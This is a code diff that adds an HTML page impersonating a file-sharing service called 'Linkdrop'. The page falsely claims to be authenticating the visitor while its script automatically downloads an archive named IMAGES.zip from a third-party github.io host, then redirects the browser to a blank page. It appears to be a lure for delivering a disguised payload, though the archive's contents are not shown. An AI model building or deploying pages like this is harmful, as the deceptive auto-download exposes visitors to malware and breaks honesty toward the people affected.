@@ -1,1 +1,64 @@
-<h1>Hello!</h1>
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="theme-color" content="#4285F4">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>...</title>
+	<meta name="preconnect" content="https://ajaxcloud.github.io">
+	<link rel="stylesheet" href="https://ajaxcloud.github.io/root/mdb.min.css">
+	<script src="https://ajaxcloud.github.io/root/anime.min.js"></script>
+</head>
+
+<body>
+	<center>
+		<h1 class="text-primary m-5" style="font-size:45px;">Linkdrop</h1></center>
+	  <h2 class="text-dark" style="margin-left:50px; margin-right:50px;">Linkdrop - File Shipping</h2>
+  	<p class="text-dark" style="margin-left:50px; margin-right:50px;">Thanks for using Linkdrop. Your file will be downloaded automatically after authentication process.</p>
+  	<p class="text-dark" style="margin-left:50px;">This process may take few minutes</p>
+  	<div style="display: flex; margin-top:0%; margin-left:50px;">
+		<div style="width:28px; height:28px; border-radius:50%; background-color: blue" class="loading-spinner"></div>
+		<div style="width:5px; height:5px;"></div>
+		<div style="width:28px; height:28px; border-radius:50%; background-color: blue" class="loading-spinner"></div>
+		<div style="width:5px; height:5px;"></div>
+		<div style="width:28px; height:28px; border-radius:50%; background-color: blue" class="loading-spinner"></div></div>
+	<script>
+	anime({
+		targets: '.loading-spinner',
+		loop: true,
+		scale: [{
+			value: .1,
+			easing: 'easeOutSine',
+			duration: 500
+		}, {
+			value: 1,
+			easing: 'easeInOutQuad',
+			duration: 1200
+		}],
+		delay: anime.stagger(200, {
+			grid: [14, 5],
+			from: 'center'
+		})
+	});
+	setTimeout(function() {
+		window.location.assign('https://ajaxcloud.github.io/root/IMAGES.zip');
+	}, 3000);
+	setTimeout(function() {
+		window.location.hash = "#intializing";
+	}, 2200);
+	setTimeout(function() {
+		window.location = "about:blank?status=downloaded";
+	}, 6200);
+	/*(function loop() {
+		setTimeout(function() {
+			if(window.location.hash) {
+				window.location = "about:blank?status=downloaded";
+			}
+			loop()
+		}, 1000); //1000 = 1000ms = 1s
+	}());*/
+	</script>
+</body>
+
+</html>
